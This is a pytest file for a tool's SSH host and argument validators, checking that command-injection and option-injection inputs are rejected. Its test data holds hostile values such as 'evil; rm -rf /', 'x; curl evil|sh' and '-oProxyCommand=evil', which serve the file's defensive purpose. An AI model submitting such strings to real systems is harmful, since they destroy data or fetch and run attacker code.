"""ssh_exec host/arg validation — blocks command & argument injection."""
from tools.infrastructure import _valid_ssh_host, _valid_ssh_arg


def test_valid_hosts():
    for h in ("plutus", "192.168.1.111", "100.64.0.1", "host.example.com", "my-nas"):
        assert _valid_ssh_host(h), h


def test_injection_hosts_rejected():
    for h in ("evil; rm -rf /", "host$(whoami)", "a b", "host|cat", "host`id`", "host&x", ""):
        assert not _valid_ssh_host(h), h


def test_option_injection_host_rejected():
    # leading dash would be parsed by ssh as an option
    assert not _valid_ssh_host("-oProxyCommand=evil")


def test_valid_args():
    for a in ("jellyfin", "nginx.service", "/var/log/syslog", "8.8.8.8", "container_1"):
        assert _valid_ssh_arg(a), a


def test_injection_args_rejected():
    for a in ("x; curl evil|sh", "$(id)", "a b", "x`id`", "x|y", "x&y", "x>f"):
        assert not _valid_ssh_arg(a), a
